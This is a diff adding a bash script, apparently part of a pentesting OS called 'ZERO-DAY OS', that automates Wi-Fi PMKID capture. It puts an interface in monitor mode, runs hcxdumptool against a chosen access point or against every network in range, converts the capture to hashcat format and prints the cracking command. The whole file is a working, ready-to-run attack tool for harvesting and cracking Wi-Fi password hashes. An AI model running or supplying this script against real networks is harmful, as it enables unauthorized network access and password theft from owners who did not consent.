@@ -1,0 +1,62 @@
+#!/bin/bash
+# /usr/local/bin/wifi-pmkid
+# PMKID capture via hcxdumptool (no client needed)
+# Usage: wifi-pmkid <iface> [bssid] [channel]
+
+IFACE="${1:-wlan0}"
+BSSID="$2"
+CHAN="$3"
+OUTDIR="/opt/cardputer/pmkid"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[!] Root required."
+    exit 1
+fi
+
+mkdir -p "$OUTDIR"
+
+echo "[*] ZERO-DAY OS — PMKID Capture"
+echo ""
+
+IFTYPE=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')
+if [ "$IFTYPE" != "monitor" ]; then
+    echo "[*] Setting $IFACE to monitor mode..."
+    ip link set "$IFACE" down
+    iw dev "$IFACE" set type monitor
+    ip link set "$IFACE" up
+    sleep 1
+fi
+
+if [ -n "$BSSID" ] && [ -n "$CHAN" ]; then
+    OUTFILE="$OUTDIR/pmkid_${BSSID//:/}_ch${CHAN}_${TIMESTAMP}"
+    echo "[*] Targeted PMKID capture: $BSSID on channel $CHAN"
+    echo "[*] Output: $OUTFILE"
+    echo ""
+
+    iw dev "$IFACE" set channel "$CHAN"
+    hcxdumptool -i "$IFACE" --filter_ap="$BSSID" -o "$OUTFILE" --enable_status=1 -t 30
+else
+    OUTFILE="$OUTDIR/pmkid_all_${TIMESTAMP}"
+    echo "[*] Broad PMKID capture (all networks) on $IFACE"
+    echo "[*] Output: $OUTFILE"
+    echo "[*] Running for 60 seconds..."
+    echo ""
+
+    hcxdumptool -i "$IFACE" -o "$OUTFILE" --enable_status=1 -t 60
+fi
+
+echo ""
+echo "[*] Converting to hashcat format..."
+hcxpcapngtool -o "${OUTFILE}.22000" "$OUTFILE" 2>/dev/null
+
+if [ -f "${OUTFILE}.22000" ]; then
+    HASHES=$(wc -l < "${OUTFILE}.22000")
+    echo "[+] $HASHES PMKID hash(es) extracted"
+    echo "[+] Hashcat: hashcat -m 22000 ${OUTFILE}.22000 wordlist.txt"
+else
+    echo "[!] No PMKID hashes found in capture."
+fi
+
+iw dev "$IFACE" set type managed 2>/dev/null
+ip link set "$IFACE" up 2>/dev/null
